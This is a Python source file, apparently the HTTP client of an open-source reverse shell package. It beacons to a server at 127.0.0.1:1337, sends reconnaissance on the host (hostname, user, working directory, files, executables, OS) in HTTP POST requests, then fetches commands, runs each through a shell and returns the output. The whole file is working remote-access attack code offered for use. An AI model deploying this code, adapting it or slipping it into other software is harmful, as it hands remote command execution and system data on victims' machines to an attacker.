#!/usr/bin/env python3
# -*- coding: utf-8 -*-

###################
#    This package implements an advanced reverse shell console.
#    Copyright (C) 2023  Maurice Lambert

#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, either version 3 of the License, or
#    (at your option) any later version.

#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.

#    You should have received a copy of the GNU General Public License
#    along with this program.  If not, see <https://www.gnu.org/licenses/>.
###################

"""
This package implements an advanced reverse shell
console (supports: TCP, UDP, IRC, HTTP and DNS).
"""

__version__ = "0.0.4"
__author__ = "Maurice Lambert"
__author_email__ = "mauricelambert434@gmail.com"
__maintainer__ = "Maurice Lambert"
__maintainer_email__ = "mauricelambert434@gmail.com"
__description__ = """
This package implements an advanced reverse shell
console (supports: TCP, UDP, IRC, HTTP and DNS).
"""
license = "GPL-3.0 License"
__url__ = "https://github.com/mauricelambert/ReverseShell"

copyright = """
ReverseShell  Copyright (C) 2023  Maurice Lambert
This program comes with ABSOLUTELY NO WARRANTY.
This is free software, and you are welcome to redistribute it
under certain conditions.
"""
__license__ = license
__copyright__ = copyright

__all__ = []

print(copyright)

from json import dumps
from socket import socket
from os.path import exists
from getpass import getuser
from contextlib import suppress
from subprocess import run, PIPE
from platform import node, system
from os import getcwd, environ, listdir, name


def get_executables():
    return [
        file
        for directory in environ["PATH"].split(":" if name != "nt" else ";")
        if exists(directory)
        for file in listdir(directory)
    ]


def sendall(data):
    chunk = data[:30000]
    data = data[30000:]
    while chunk:
        s.sendall(chunk)
        chunk = data[:30000]
        data = data[30000:]


format_ = b"POST / HTTP/1.0\r\nContent-Type: {type}\r\nHost: 127.0.0.1\r\nContent-Length: {length}\r\n\r\n"

while True:
    with suppress(Exception):
        recevied = b""
        while recevied != b"\6":
            s = socket()
            s.connect(("127.0.0.1", 1337))
            data = (
                b"\1"
                + dumps(
                    {
                        "hostname": node(),
                        "user": getuser(),
                        "cwd": getcwd(),
                        "executables": get_executables(),
                        "files": listdir(),
                        "system": system(),
                    }
                ).encode()
            )
            sendall(
                format_.replace(
                    b"{type}", b"application/json; charset=utf-8"
                ).replace(b"{length}", str(len(data)).encode("latin-1"))
                + data
            )
            recevied = s.recv(65535).split(b"\r\n\r\n", 1)[1]
            s.close()

        data = b" "
        while True:
            s = socket()
            s.connect(("127.0.0.1", 1337))
            sendall(
                format_.replace(
                    b"{type}", b"text/plain; charset=utf-8"
                ).replace(b"{length}", str(len(data)).encode("latin-1"))
                + data
            )
            command = s.recv(65535).split(b"\r\n\r\n", 1)[1].decode()
            p = run(command, shell=True, stdout=PIPE, stderr=PIPE)
            data = p.stdout or p.stderr or b" "
            s.close()
